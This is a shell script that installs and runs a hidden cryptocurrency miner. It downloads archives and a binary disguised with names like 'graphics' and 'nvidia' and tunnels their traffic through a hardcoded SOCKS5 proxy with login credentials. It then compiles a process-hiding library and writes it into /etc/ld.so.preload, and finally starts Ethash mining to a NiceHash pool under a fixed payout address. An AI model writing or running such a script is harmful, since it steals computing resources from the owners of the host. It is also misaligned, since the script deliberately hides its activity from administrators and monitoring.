#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 18.220.200.169:1080
socks5_username = sempakcok
socks5_password = gunturmanis
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/nvidia
chmod +x nvidia

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNvidia.zip
unzip magicNvidia.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./nvidia -a ETHASH --pool daggerhashimoto.usa-west.nicehash.com:33353 --tls on --user 3FNS3ubK3e76wiiLPMTK4K2ESw1GUgtXh5 --worker nvidia --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROXY --basecolor
